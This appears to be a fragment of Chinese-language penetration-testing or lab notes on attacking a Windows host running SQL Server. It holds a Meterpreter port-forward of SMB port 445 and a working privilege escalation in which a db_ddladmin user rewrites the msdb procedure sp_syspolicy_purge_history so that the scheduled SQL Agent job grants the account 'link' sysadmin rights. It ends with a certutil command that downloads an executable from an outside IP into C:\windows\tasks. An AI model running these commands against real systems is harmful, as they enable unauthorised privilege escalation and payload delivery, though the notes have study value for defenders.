...
正向转发
```zsh
portfwd add --remote 192.168.176.129:445 --bind 127.0.0.1:445
...
```
#### db_ddladmin 滥用（劫持定时计划提权sa）
需求：需要有db_ddladmin权限

原理：db_ddladmin 角色允许用户修改（ALTER）数据库内的任何 DDL（数据定义语言）对象，包括存储过程。存储过程 msdb.dbo.sp_syspolicy_purge_history 是一个系统内部存储过程，它默认会被 SQL Server Agent 的一个内置作业（名为 syspolicy_purge_history）定期执行（通常是每天）。更重要的是，这个 SQL Server Agent 作业在执行时，是以拥有高权限（通常是 sysadmin）的用户身份运行的。
...
```zsh
use [msdb]
ALTER PROCEDURE [dbo].[sp_syspolicy_purge_history] AS BEGIN ALTER SERVER ROLE [sysadmin] ADD MEMBER [link] END
```
此后当定时任务执行，link会获得sa权限
...
certutil -urlcache -split -f http://10.10.16.9/1.exe C:\windows\tasks\1.exe
powershell
